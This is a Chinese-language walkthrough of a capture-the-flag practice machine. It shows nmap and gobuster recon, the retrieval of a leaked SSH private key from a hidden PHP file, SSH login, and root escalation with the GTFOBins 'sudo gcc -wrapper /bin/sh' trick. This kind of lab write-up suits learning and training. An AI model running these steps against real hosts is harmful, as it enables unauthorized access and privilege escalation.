## 靶机信息
- 级别:容易
- 基于vmware
- user.txt和root.txt

## SSH私钥泄露,目录爆破

## Recon
### nmap
```shell
nmap -sn 192.168.1.0/24
//IP:192.168.1.142

sudo nmap -sT -p- --min-rate 10000 192.168.1.142 -oA nmap_tcp
//Ports  STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```
## Web
![[Pasted image 20231007204722.png]]
### 目录爆破
```shell
gobuster dir -u http://192.168.1.142 -w /usr/share/wordlists/dirb/common.txt -x txt,php,html

///key.php              (Status: 200) [Size: 287]
```

![[Pasted image 20231007204931.png]]
### HTTP-Enum
```shell
nmap --script=http-enum 192.168.1.142
| http-enum: 
|_  /d41d8cd98f00b204e9800998ecf8427e.php: Seagate BlackArmorNAS 110/220/440 Administrator Password Reset Vulnerability
```
访问 /d41d8cd98f00b204e9800998ecf8427e.php 文件，是一个openssh私钥

![[Pasted image 20231007212106.png]]
容易遗漏源码title中的内容

## 提权
### 获得立足点
```shell
sudo chmod 600 key
ssh -i key mpampis@192.168.1.142
```
### user flag
```shell
// /home/mpampis下获得user flag
2cb67a256530577868009a5944d12637
```

### 利用sudo gcc 提权
```shell
sudo -l
Matching Defaults entries for mpampis on nyx:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User mpampis may run the following commands on nyx:
    (root) NOPASSWD: /usr/bin/gcc

// https://gtfobins.github.io/gtfobins/gcc/#shell
sudo gcc -wrapper /bin/sh,-s .
// 成功提权
```

![[Pasted image 20231007213429.png]]










